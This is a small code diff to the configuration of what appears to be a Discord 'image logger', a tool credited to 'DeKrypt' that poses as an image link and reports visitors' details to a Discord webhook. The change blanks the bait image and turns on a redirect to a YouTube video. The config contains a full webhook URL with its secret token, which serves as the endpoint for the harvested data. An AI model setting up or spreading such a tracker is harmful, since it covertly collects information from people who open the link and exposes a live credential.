@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1074401525218164796/dIqsFXxXxvsgEk8eAHhYekeHK8NrfdZM8fVUWp36LFqFNq4m8SCLTPubFHwUSZAota1Q",
-    "image": "https://childhoodmagic.com/wp-content/uploads/2022/09/Childhood-Magic-Winter-tic-tac-toe-printable-bw-1.jpg", # You can also have a custom image by using a URL argument
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
@@ -44,7 +44,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://www.youtube.com/watch?v=dQw4w9WgXcQ" # Link to the webpage to redirect to
     },
 
